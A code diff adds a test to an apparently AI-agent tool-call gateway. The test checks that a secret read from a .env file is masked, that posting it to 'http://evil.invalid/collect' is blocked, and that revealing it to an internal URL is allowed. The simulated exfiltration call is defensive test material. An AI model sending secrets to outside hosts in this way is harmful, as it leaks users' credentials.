@@ -354,3 +354,119 @@ test "ledger chain verifies and detects tampering" {
   }
   inspect(broken_flag, content="true")
 }
+
+///|
+test "secrets are masked in results and revealed only for approved destinations" {
+  let policy_text =
+    #|{"version":1,"name":"secret","default_decision":"deny",
+    #| "rules":[
+    #|  {"id":"read","tool":"fs.read","decision":"allow"},
+    #|  {"id":"post","tool":"net.post","decision":"allow"}
+    #| ],
+    #| "sensitive":[{"tool":"fs.read","when":[{"arg":"path","glob":["**/*.env"]}]}],
+    #| "reveal":[{"id":"internal","tool":"net.post","when":[{"arg":"url","prefix":["http://internal/"]}]}],
+    #| "egress":{"tools":["net.*"],"on_taint":"deny"},
+    #| "min_secret_len":12}
+  let policy = parse_policy(policy_text) catch { _ => abort("bad policy") }
+  let session = new_session("secret", policy)
+  let ledger : Array[String] = []
+  let raw_secret = "sk-live-abcd1234efgh"
+
+  let read = client_line(
+    session,
+    request_line(
+      1,
+      "tools/call",
+      call_params("fs.read", json_obj([("path", json_str("config/.env"))])),
+    ),
+    1000L,
+  )
+  collect_ledger(read, ledger)
+  let read_result = json_render(
+    json_obj([
+      ("jsonrpc", json_str("2.0")),
+      ("id", json_int(1)),
+      (
+        "result",
+        json_obj([
+          (
+            "content",
+            json_arr([
+              json_obj([
+                ("type", json_str("text")),
+                ("text", json_str("API_KEY=" + raw_secret)),
+              ]),
+            ]),
+          ),
+        ]),
+      ),
+    ]),
+  )
+  let masked = server_line(session, read_result, 1001L)
+  collect_ledger(masked, ledger)
+  let to_client = lines_of(masked, "client")[0]
+  inspect(to_client.contains(raw_secret), content="false")
+  inspect(to_client.contains("«mg:"), content="true")
+  let start = find_substring(to_client, "«mg:")
+  let placeholder = to_client[start:start + 21].to_owned()
+
+  let external = client_line(
+    session,
+    request_line(
+      2,
+      "tools/call",
+      call_params(
+        "net.post",
+        json_obj([
+          ("url", json_str("http://evil.invalid/collect")),
+          ("body", json_str(placeholder)),
+        ]),
+      ),
+    ),
+    1002L,
+  )
+  collect_ledger(external, ledger)
+  inspect(lines_of(external, "upstream").length(), content="0")
+  inspect(
+    lines_of(external, "client")[0].contains("secret-reveal"),
+    content="true",
+  )
+
+  let internal = client_line(
+    session,
+    request_line(
+      3,
+      "tools/call",
+      call_params(
+        "net.post",
+        json_obj([
+          ("url", json_str("http://internal/collect")),
+          ("body", json_str(placeholder)),
+        ]),
+      ),
+    ),
+    1003L,
+  )
+  collect_ledger(internal, ledger)
+  let forwarded = lines_of(internal, "upstream")
+  inspect(forwarded.length(), content="1")
+  inspect(forwarded[0].contains(raw_secret), content="true")
+  inspect(forwarded[0].contains("«mg:"), content="false")
+  for line in ledger {
+    inspect(line.contains(raw_secret), content="false")
+  }
+  let verified = verify_ledger(ledger)
+  let intact = match json_get(verified, "ok") {
+    Some(True) => true
+    _ => false
+  }
+  inspect(intact, content="true")
+}
+
+///|
+fn find_substring(text : String, needle : String) -> Int32 {
+  match text.find(needle) {
+    Some(index) => index
+    None => 0
+  }
+}
